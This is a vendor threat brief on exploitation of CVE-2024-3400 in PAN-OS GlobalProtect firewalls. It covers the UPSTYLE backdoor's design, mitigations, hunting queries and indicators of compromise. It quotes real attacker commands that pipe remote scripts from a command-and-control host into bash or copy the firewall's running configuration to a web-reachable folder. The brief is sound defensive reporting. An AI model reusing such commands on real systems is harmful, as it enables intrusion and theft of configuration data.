
[![Logo](/wp-content/uploads/2021/07/PANW_Parent.png)](https://www.paloaltonetworks.com/)

[![Unit42 Logo](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/unit42-logo-white.svg)](https://unit42.paloaltonetworks.com/)

Menu

* [Tools](https://unit42.paloaltonetworks.com/tools/)
* [ATOMs](https://unit42.paloaltonetworks.com/atoms/)
* [Security Consulting](https://www.paloaltonetworks.com/unit42)
* [About Us](https://unit42.paloaltonetworks.com/about-unit-42/)
* [**Under Attack?**](https://start.paloaltonetworks.com/contact-unit42.html)

* [Threat Research Center](https://unit42.paloaltonetworks.com "Threat Research")
* [High Profile Threats](https://unit42.paloaltonetworks.com/category/top-cyberthreats/ "High Profile Threats")
* [Vulnerabilities](https://unit42.paloaltonetworks.com/category/vulnerabilities/ "Vulnerabilities")

[Vulnerabilities](https://unit42.paloaltonetworks.com/category/vulnerabilities/)
# Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20)

![Clock Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg)  12  min read

Related Products[![Advanced Threat Prevention icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png)Advanced Threat Prevention](https://unit42.paloaltonetworks.com/product-category/advanced-threat-prevention/ "Advanced Threat Prevention")[![Cortex XDR icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png)Cortex XDR](https://unit42.paloaltonetworks.com/product-category/cortex-xdr/ "Cortex XDR")[![Cortex Xpanse icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png)Cortex Xpanse](https://unit42.paloaltonetworks.com/product-category/cortex-xpanse/ "Cortex Xpanse")[![Cortex XSIAM icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png)Cortex XSIAM](https://unit42.paloaltonetworks.com/product-category/cortex-xsiam/ "Cortex XSIAM")[![Managed Threat Hunting icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/unit42_RGB_logo_Icon_Color.png)Managed Threat Hunting](https://unit42.paloaltonetworks.com/product-category/managed-threat-hunting/ "Managed Threat Hunting")[![Next-Generation Firewall icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png)Next-Generation Firewall](https://unit42.paloaltonetworks.com/product-category/next-generation-firewall/ "Next-Generation Firewall")[![Prisma Access icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/prisma_RGB_logo_Icon_Color.png)Prisma Access](https://unit42.paloaltonetworks.com/product-category/prisma-access/ "Prisma Access")

* ![Profile Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-profile-grey.svg)
  By:
  + [Unit 42](https://unit42.paloaltonetworks.com/author/unit42/)
* ![Published Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-calendar-grey.svg)
  Published:April 12, 2024
* ![Tags Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-category.svg)Categories:
  + [High Profile Threats](https://unit42.paloaltonetworks.com/category/top-cyberthreats/)
  + [Malware](https://unit42.paloaltonetworks.com/category/malware/)
  + [Vulnerabilities](https://unit42.paloaltonetworks.com/category/vulnerabilities/)
* ![Tags Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-tags-grey.svg)Tags:
  + [Backdoor](https://unit42.paloaltonetworks.com/tag/backdoor/)
  + [Command injection](https://unit42.paloaltonetworks.com/tag/command-injection/)
  + [CVE-2024-3400](https://unit42.paloaltonetworks.com/tag/cve-2024-3400/)
  + [MidnightEclipse](https://unit42.paloaltonetworks.com/tag/midnighteclipse/)
  + [Python](https://unit42.paloaltonetworks.com/tag/python/)
  + [Upstyle](https://unit42.paloaltonetworks.com/tag/upstyle/)

* [![Download Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-download.svg)](https://unit42.paloaltonetworks.com/cve-2024-3400/?pdf=download&lg=en&_wpnonce=a05dacd8dc "Click here to download")
* [![Print Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-print.svg)](https://unit42.paloaltonetworks.com/cve-2024-3400/?pdf=print&lg=en&_wpnonce=a05dacd8dc "Click here to print")

Share![Down arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg)

* ![Link Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg)
* ![Link Email](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg)
* [![Facebook Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg)](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F "Share in Facebook")
* [![LinkedIn Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg)](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F&title=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020) "Share in LinkedIn")
* [![Twitter Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg)](https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F&text=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020) "Share in Twitter")
* [![Reddit Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg)](//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F "Share in Reddit")
* [![Mastodon Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg)](https://mastodon.social/share?text=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020)%20https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F "Share in Mastodon")

This post is also available in:
[日本語 (Japanese)](https://unit42.paloaltonetworks.jp/cve-2024-3400/)

## Executive Summary

**This threat brief is monitored daily and updated as new intelligence is available for us to share. The full update log is at the end of this post and offers the fullest account of all changes made.**

Palo Alto Networks and Unit 42 are engaged in tracking activity related to CVE-2024-3400 and are working with external researchers, partners and customers to share information transparently and rapidly.

A critical command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. The vulnerability, assigned CVE-2024-3400, has a CVSS score of 10.0.

This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both). This issue does not affect cloud firewalls (Cloud NGFW), Panorama appliances or Prisma Access.

For up-to-date information about affected products and versions, please refer to the [Palo Alto Networks Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400) on this issue. Additionally, [episode 21 of the Unit 42 podcast Threat Vector](https://thecyberwire.com/podcasts/threat-vector/21/notes) covers the discovery, technical details and exploitation of the vulnerability.

Palo Alto Networks is aware of an increasing number of attacks that leverage the exploitation of this vulnerability. Third parties have disclosed proofs of concept for this vulnerability. We are also aware of a proof of concept including post-exploit persistence techniques that survive resets and upgrades. We are not aware of any malicious attempts to use these persistence techniques in active exploitation of the vulnerability at this time.

We are tracking the initial exploitation of this vulnerability under the name Operation MidnightEclipse.

The section [Current Scope of the Attack](#post-133365-_50343o6a6han) includes information on the types of exploitation activity we have seen, as well as their relative prevalence. The vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some compromises of PAN-OS that are limited to confirming that the device is exploitable.

Other cases have included the following activity:

* Limited attempts in which a file on the hard drive has been copied to a location accessible via a web request
* A very limited number of compromises that led to interactive command execution

This threat brief will cover information about the vulnerability and what we know about post-exploitation activity. We will share guidance to mitigate the vulnerability, though readers should also refer to the [Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400) for specific product version information and remediation guidance. We will continue to update this threat brief as more information becomes available.

If you believe your firewall has been compromised, please reach out to [Palo Alto Networks support](https://support.paloaltonetworks.com/).

This issue is fixed in [hotfix releases](https://security.paloaltonetworks.com/CVE-2024-3400) of PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3 and all later PAN-OS versions. Hotfixes for other commonly deployed maintenance releases are also available. Additional guidance on mitigation for customers is available in the [Security Advisory.](https://security.paloaltonetworks.com/CVE-2024-3400)

A Knowledge Base article, [How to Remedy CVE-2024-3400](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK), is available in the Customer Support Portal.

As a matter of best practice, Palo Alto Networks recommends that you monitor your network for abnormal activity and investigate any unexpected network activity.

We would like to thank Volexity for finding this issue and their continuing coordination and partnership. Please reference Volexity’s [blog](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400) for their analysis.

Palo Alto Networks customers receive protections from and mitigations for CVE-2024-3400 and malware used in post-exploitation activity in the following ways:

Customers with a Threat Prevention subscription can block attacks for this vulnerability using Threat ID [95187](https://threatvault.paloaltonetworks.com/?query=95187), [95189](https://threatvault.paloaltonetworks.com/?query=95189) and [95191](https://threatvault.paloaltonetworks.com/?query=95191) (available in Applications and Threats content version 8836-8695 and later). [Our advisory has been updated](https://security.paloaltonetworks.com/CVE-2024-3400) with new Threat Prevention content updates for additional Threat Prevention IDs around CVE-2024-3400.

To apply the Threat IDs, customers must ensure that vulnerability protection has been applied to their GlobalProtect interface to prevent exploitation of this issue on their device. Please see the relevant [LIVEcommunity article](https://live.paloaltonetworks.com/t5/globalprotect-articles/applying-vulnerability-protection-to-globalprotect-interfaces/ta-p/340184) for more information.

The [Managed Threat Hunting](#post-133365-_vgezw6a4uez) section below includes XQL queries that can be used to search for signs of exploitation of this CVE.

| **Vulnerabilities Discussed** | [CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400) |
| --- | --- |

## Details of the Vulnerability

A command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both).

Palo Alto Networks is aware of targeted attacks that leverage this vulnerability. The next section covers details of the post-exploitation activity we’ve observed.

## Current Scope of the Attack

Palo Alto Networks has classified observations of attempted exploitation into several levels, from Level 0 to Level 3. In all cases we recommend following the guidance in the [Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400).

**Level 0: Probe –** An unsuccessful exploitation attempt. Forensic artifacts indicate that the attempt was made to access the customer network, but the attacker did not actually succeed. Palo Alto Networks assesses there is likely *little to no* immediate impact of a Level 0 attempt.

**Level 1: Test** **– The vulnerability was being tested on the device. A 0-byte file has been created and is resident on the firewall. However, there is no indication of any known unauthorized command execution.**

**Level 2: Potential Exfiltration –** A file on the device has been copied to a location accessible via a web request, though the file may or may not have been subsequently downloaded. Typically, the file we have observed being copied is running\_config.xml.

**Level 3: Interactive Access** **–** There are signs of interactive command execution. This may include shell-based backdoors, introduction of code, downloading files or running commands.

It is important to note that *the vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some Level 1 compromises of PAN-OS*. Other cases have included limited Level 2 and very limited Level 3 compromises of those targeted firewalls.

## UPSTYLE and Cron Job Backdoor Activity

As part of the activity observed in Operation MidnightEclipse, the threat actor exploited CVE-2024-3400 to run commands on the firewall. We have determined that the threat actor initially intended to install a Python-based backdoor, which our colleagues at Volexity referred to as UPSTYLE.

We believe the threat actors created UPSTYLE specifically for this campaign. However, the threat actors were unsuccessful at installing UPSTYLE after three different exploit attempts. After the third failed attempt, the threat actor decided to install a cron job backdoor to carry out their post-exploitation activities.

After failing to install UPSTYLE, the threat actor was observed exploiting CVE-2024-3400 to run a handful of the commands on the firewall. The commands included copying configuration files to the web application folder and exfiltrating them via HTTP requests to those files.

The following IP address was seen attempting to access a specific configuration file copied to this folder, which we believe is a VPN used by the threat actor:

* 66.235.168[.]222

After gathering configuration files, the threat actor exploited the vulnerability to run the following command to receive additional commands from an external server in the form of a bash script:

* wget -qO- hxxp://172.233.228[.]93/patch|bash

We were unable to access the bash script hosted at this URL. However, shortly after we saw evidence of the creation of a cron job. This cron job would run every minute to access commands hosted on the same external server that would execute via bash, as seen in the following command:

* wget -qO- hxxp://172.233.228[.]93/policy | bash

We were unable to access the commands executed via this URL, but we believe this cron job-based backdoor was used to carry out the actor’s post-exploitation activities.

While the threat actors were unable to install the UPSTYLE backdoor, it appears that they created it specifically for this campaign and planned on using it as the initial backdoor. Also, the reason the actors failed to install UPSTYLE included mistakes in the exploit attempts themselves, as well as trivial mistakes in the executed commands. While we have not seen UPSTYLE used in any other exploit attempts, it is possible that UPSTYLE could have been successfully installed on other devices.

As previously mentioned, the threat actors attempted three unsuccessful exploit attempts to run commands to install UPSTYLE. For two of these attempts, UPSTYLE was hosted at hxxp://144.172.79[.]92/update.py.

In the third exploit attempt, we saw the actor hosting the backdoor at nhdata.s3-us-west-2.amazonaws[.]com, which may suggest that the actors thought network-based protections caused the first two failed installation attempts. According to the following HTTP headers, it appears that the threat actor last modified UPSTYLE hosted at 144.172.79[.]92 on April 7, 2024:

Accept-Ranges: bytes
Content-Length: 5187
Content-Type: application/octet-stream
Date: Thu, 11 Apr 2024 16:12:16 GMT
Etag: "6612443d-1443"
Last-Modified: Sun, 07 Apr 2024 06:59:09 GMT
Server: nginx/1.18.0 (Ubuntu)

| 1234567 | Accept-Ranges: bytesContent-Length: 5187Content-Type: application/octet-streamDate: Thu, 11 Apr 2024 16:12:16 GMTEtag: "6612443d-1443"Last-Modified: Sun, 07 Apr 2024 06:59:09 GMTServer: nginx/1.18.0 (Ubuntu) |
| --- | --- |

The update.py file hosted at 144.172.79[.]92 has a SHA256 value of 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac. This file is a backdoor that has multiple layers.

First, update.py writes another Python script to the following location:

* [snip]/site-packages/system.pth

The Python script written to system.pth Base64-decodes an embedded Python script and executes it. This embedded Python script has two functions named protect and check, which are called in that order.

The protect function sends a SIGTERM signal and writes the contents of the system.pth file back to itself, likely as a persistence mechanism. The check function will read /proc/self/cmdline to see if it is running as monitor mp before running another Base64 embedded Python script, which is the functional backdoor.

The Python script run by system.pth has a function named \_\_main that will run in a thread. This function first reads the contents of the following file, along with its access and modified times:

* [snip]/css/bootstrap.min.css

It then enters an infinite loop that iterates once every two seconds, reading in the following file:

* [snip]/sslvpn\_ngx\_error.log

The script will then iterate through each line of the file and search the line for the threat actor's command using the following regular expression:

* img\[([a-zA-Z0-9+/=]+)\]

If the above regular expression matches, the script will Base64-encode the contents of the command and run it using the popen method within Python's OS module. The lines of the sslvpn\_ngx\_error.log file that do not match the regular expression are written back to the file, which essentially prunes the lines that contain commands from persisting in the sslvpn\_ngx\_error.log file for later analysis.

After running the command, the script writes the output of the command to the following file:

* [snip]/css/bootstrap.min.css

The script will then create another thread that runs a function called restore. The restore function takes the original content of the bootstrap.min.css file, as well as the original access and modified times, sleeps for 15 seconds and writes the original contents back to the file. It then sets the access and modified times back to their original values.

The point of this function is to avoid leaving the output of the commands available for analysis. Also, this suggests that the threat actor has automation built into the client side of this backdoor, as they only have 15 seconds to grab the results before the backdoor overwrites the file.

The use of legitimate log files to receive commands and a legitimate CSS file to exfiltrate the command results suggests that the threat actors developed this backdoor specifically to run on a compromised firewall.

## Guidance

We strongly advise customers to immediately upgrade to a fixed version of PAN-OS to protect their devices even when workarounds and mitigations have been applied.

This issue is fixed in hotfix releases of PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3, and in all later PAN-OS versions.

Please see the frequently updated [Palo Alto Networks Security Advisory on CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400) for information on hotfixes and the most current guidance for mitigating this vulnerability. A Knowledge Base article, [How to Remedy CVE-2024-3400](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK), is available in the Customer Support Portal.

In earlier versions of this advisory, disabling device telemetry was listed as a secondary mitigation action. Disabling device telemetry is no longer an effective mitigation. Device telemetry does not need to be enabled for PAN-OS firewalls to be exposed to attacks related to this vulnerability.

## Unit 42 Managed Threat Hunting Queries

The Unit 42 Managed Threat Hunting team continues to track any attempts to exploit this CVE across our customers, using Cortex XDR and the XQL queries below. Cortex XDR customers can also use these XQL queries to search for signs of exploitation.

// Description: Search for domain IOC in raw NGFW logs
dataset = panw\_ngfw\_url\_raw
| filter url\_domain ~= ".\*nhdata.s3-us-west-2.amazonaws.com"
| fields \_time, log\_source\_name, action, app, url\_domain, uri, url\_category, source\_ip, source\_port, dest\_ip, dest\_port, protocol, rule\_matched, rule\_matched\_uuid

| 1234 | // Description: Search for domain IOC in raw NGFW logsdataset = panw\_ngfw\_url\_raw| filter url\_domain ~= ".\*nhdata.s3-us-west-2.amazonaws.com"| fields \_time, log\_source\_name, action, app, url\_domain, uri, url\_category, source\_ip, source\_port, dest\_ip, dest\_port, protocol, rule\_matched, rule\_matched\_uuid |
| --- | --- |

// Description: Detect hits for the specific prevention signature for CVE-2024-3400
config case\_sensitive = false
| dataset = panw\_ngfw\_threat\_raw
| filter threat\_id in (95187,95189,95191)
| fields \_time, log\_source\_name, action, app\_category, app\_sub\_category, threat\_id, threat\_name, source\_ip, source\_port, dest\_ip, dest\_port, \*

| 12345 | // Description: Detect hits for the specific prevention signature for CVE-2024-3400config case\_sensitive = false| dataset = panw\_ngfw\_threat\_raw| filter threat\_id in (95187,95189,95191)| fields \_time, log\_source\_name, action, app\_category, app\_sub\_category, threat\_id, threat\_name, source\_ip, source\_port, dest\_ip, dest\_port, \* |
| --- | --- |

// Description: Hits for known IOCs in NGFW traffic
config case\_sensitive = false
| dataset = panw\_ngfw\_traffic\_raw
| filter source\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") or dest\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92")
| fields \_time, log\_source\_name, action, action\_source, app, bytes\_sent, bytes\_received, bytes\_total, source\_ip, source\_port, dest\_ip, dest\_port, protocol, rule\_matched, rule\_matched\_uuid, session\_end\_reason

| 12345 | // Description: Hits for known IOCs in NGFW trafficconfig case\_sensitive = false| dataset = panw\_ngfw\_traffic\_raw| filter source\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") or dest\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") | fields \_time, log\_source\_name, action, action\_source, app, bytes\_sent, bytes\_received, bytes\_total, source\_ip, source\_port, dest\_ip, dest\_port, protocol, rule\_matched, rule\_matched\_uuid, session\_end\_reason |
| --- | --- |

// Description: Hits for known IOCs in XDR telemetry and NGFW telemetry (assuming proper integration of NGFW)
config case\_sensitive = false
| dataset = xdr\_data
| filter event\_type = ENUM.STORY
| filter dst\_action\_external\_hostname ~=".\*nhdata.s3-us-west-2.amazonaws.com" OR
dns\_query\_name ~=".\*nhdata.s3-us-west-2.amazonaws.com" OR
action\_external\_hostname ~=".\*nhdata.s3-us-west-2.amazonaws.com" OR
action\_remote\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92")
| fields \_time, agent\_hostname, actor\_process\_image\_name, action\_local\_ip, action\_remote\_ip, action\_remote\_port, dns\_query\_name, action\_external\_hostname

| 123456789 | // Description: Hits for known IOCs in XDR telemetry and NGFW telemetry (assuming proper integration of NGFW)config case\_sensitive = false| dataset = xdr\_data | filter event\_type = ENUM.STORY| filter dst\_action\_external\_hostname ~=".\*nhdata.s3-us-west-2.amazonaws.com" ORdns\_query\_name ~=".\*nhdata.s3-us-west-2.amazonaws.com" ORaction\_external\_hostname ~=".\*nhdata.s3-us-west-2.amazonaws.com" ORaction\_remote\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") | fields \_time, agent\_hostname, actor\_process\_image\_name, action\_local\_ip, action\_remote\_ip, action\_remote\_port, dns\_query\_name, action\_external\_hostname |
| --- | --- |

## Additional Exploitation Observations

While continuing to monitor efforts, we have observed additional IP addresses attempting to exploit CVE-2024-3400 based on our Threat Prevention signature with a Threat ID 95187.

We have not seen any relationships between these indicators and those associated with Operation MidnightEclipse. We have grouped the latter of these indicators exclusively to the activity involving exploitation of the zero-day vulnerability and the UPSTYLE backdoor.

As of writing this update, the following IP addresses have triggered the threat prevention signature:

* 110.47.250[.]103
* 126.227.76[.]24
* 38.207.148[.]123
* 147.45.70[.]100
* 199.119.206[.]28
* 38.181.70[.]3
* 149.28.194[.]95
* 78.141.232[.]174
* 38.180.128[.]159
* 64.176.226[.]203
* 38.180.106[.]167
* 173.255.223[.]159
* 38.60.218[.]153
* 185.108.105[.]110
* 146.70.192[.]174
* 149.88.27[.]212
* 154.223.16[.]34
* 38.180.41[.]251
* 203.160.86[.]91
* 45.121.51[.]2

From our analysis, we do not see any additional activity from these IP addresses outside probing the vulnerability to determine either if the firewall is vulnerable or compromised. We have seen the following commands within the exploit attempts that the threat prevention signature is blocking:

* touch [snip]/global-protect/index.css
* touch [snip]/global-protect/portal/css/test.min.css
* cp [snip]/running-config.xml [snip]/global-protect/[16 random characters].css

The commands above show two examples of the use of the touch command to create an empty file in the web application folder. The client would then attempt to access this file via an HTTP request to determine if exploitation was successful. The third command shows a bit more malicious behavior, which involves copying the running configuration to the web application folder for access.

We have also seen probing attempts that use either wget or curl to access remote servers that an external party would use the outbound HTTP request to determine successful exploitation and command execution:

* wget srgsd1f.842b727ba4.ipv6.1433.eu[.]org
* wget edcjn.57fe6f5d9d.ipv6.1433.eu[.]org
* curl srgsdf.842b727ba4.ipv6.1433.eu[.]org
* wget --no-check-certificate https://45.121.51[.]2/abc.txt

## Conclusion

The [Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400) will continue to provide up-to-date information on impacts to Palo Alto Networks products and recommended mitigations. We will continue to update this threat brief with information on exploitation.

Again, Palo Alto Networks would like to thank Volexity for finding this issue and their continuing coordination and partnership. Please reference [Volexity's blog](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400) for their analysis.

Palo Alto Networks has shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the [Cyber Threat Alliance](https://www.cyberthreatalliance.org/).

Protections and mitigations for the observed exploitation activity are below and will be updated as more become available.

## Palo Alto Networks Product Protections for CVE-2024-3400

Palo Alto Networks customers can leverage a variety of product protections and updates to identify and defend against this threat.

If you think you may have been compromised or have an urgent matter, get in touch with [Palo Alto Networks support](https://support.paloaltonetworks.com/).

### Next-Generation Firewalls and Prisma Access With Advanced Threat Prevention

[Next-Generation Firewall](https://docs.paloaltonetworks.com/ngfw) with the [Advanced Threat Prevention](https://docs.paloaltonetworks.com/advanced-threat-prevention/administration) security subscription can help block exploitation of CVE-2024-3400 via Threat Prevention signatures [95187](https://threatvault.paloaltonetworks.com/?query=95187), [95189](https://threatvault.paloaltonetworks.com/?query=95189) and [95191](https://threatvault.paloaltonetworks.com/?query=95191).

### **Cortex XDR, XSIAM and the Unified Cloud Agent**

[Cortex XDR](https://docs-cortex.paloaltonetworks.com/p/XDR) and [XSIAM](https://docs-cortex.paloaltonetworks.com/p/XSIAM) agents and analytics help protect and detect against post-exploitation activity if an attacker tries to enumerate or laterally move to other assets.

### Cortex Xpanse and XSIAM ASM Module

[Cortex Xpanse](https://docs-cortex.paloaltonetworks.com/p/XPANSE) has the ability to identify exposed Palo Alto Networks GlobalProtect devices on the public internet and escalate these findings to defenders. Customers can enable alerting on this risk by ensuring that the Palo Alto Networks GlobalProtect Attack Surface Rule is enabled. Identified findings can either be viewed in the Threat Response Center or in the incident view of Expander. These findings are also available for Cortex XSIAM customers who have purchased the ASM module.

## Indicators of Compromise

### UPSTYLE Backdoor

* 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac
* 5460b51da26c060727d128f3b3d6415d1a4c25af6a29fef4cc6b867ad3659078

### Command and Control Infrastructure

* 172.233.228[.]93
* hxxp://172.233.228[.]93/policy
* hxxp://172.233.228[.]93/patch
* 66.235.168[.]222

### Hosted Python Backdoor

* 144.172.79[.]92
* nhdata.s3-us-west-2.amazonaws[.]com

### Observed Commands

* wget -qO- hxxp://172.233.228[.]93/patch|bash
* wget -qO- hxxp://172.233.228[.]93/policy | bash
* "failed to unmarshal session(.\+.\/" mp-log gpsvc.log\* (Please see our [Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400) for further information on this command.)

## Additional Resources

* [Understanding the Midnight Eclipse Activity and CVE 2024-3400](https://thecyberwire.com/podcasts/threat-vector/21/notes) – Unit 42 Threat Vector podcast, Episode 21, Palo Alto Networks
* [How to Remedy CVE-2024-3400](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK) – Knowledge Base, Palo Alto Networks Customer Support Portal
* [More on the PAN-OS CVE-2024-3400](https://www.paloaltonetworks.com/blog/2024/04/more-on-the-pan-os-cve/) – Palo Alto Networks Blog
* [CVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection Vulnerability in GlobalProtect](https://security.paloaltonetworks.com/CVE-2024-3400) – Palo Alto Networks
* [Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/) – Volexity
* [Palo Alto Networks Releases Guidance for Vulnerability in PAN-OS, CVE-2024-3400](https://www.cisa.gov/news-events/alerts/2024/04/12/palo-alto-networks-releases-guidance-vulnerability-pan-os-cve-2024-3400) – Cybersecurity and Infrastructure Security Agency (CISA)

## Update Log

* Updated April 12, 2024, at 10:15 a.m. PT to add Cortex XDR and XSIAM product protections, as well as Additional Resources.
* Updated April 12, 2024, at 12:45 a.m. PT to add Cortex Xpanse product protections.
* Updated April 14, 2024, at 11:05 a.m. PT to clarify impact on GlobalProtect portal configurations.
* Updated April 14, 2024, at 7:55 p.m. PT to reflect that hotfixes are in place and ETAs added in our Security Advisory for upcoming hotfixes.
* Updated April 15, 2024, at 8:35 a.m. PT to update exploitation activity in Executive Summary.
* Updated April 15, 2024, at 9:16 a.m. PT to update language on Threat ID 95187 in the Executive Summary, including information on firewalls managed by Panorama.
* Updated April 16, 2024, at 7:45 a.m. PT to add Additional Exploitation Observations section with IoCs and commands.
* Updated April 16, 2024, at 9:48 a.m. PT to remove update.py filename from list of indicators.
* Updated April 16, 2024, at 2:00 p.m. PT to update the Executive Summary and Mitigations section to add new mitigation guidance, a new Threat Prevention signature and availability of PAN-OS fixes.
* Updated April 16, 2024, at 2:40 p.m. PT to align the Executive Summary and Details of the Vulnerability sections more closely to the Security Advisory.
* Updated April 17, 2024, at 6:15 a.m. PT to add Threat ID 95191.
* Updated April 17, 2024, at 11:30 a.m. PT to add an additional bullet to the Observed Commands subsection.
* Updated April 17, 2024, at 12:23 p.m. PT to clarify contact information.
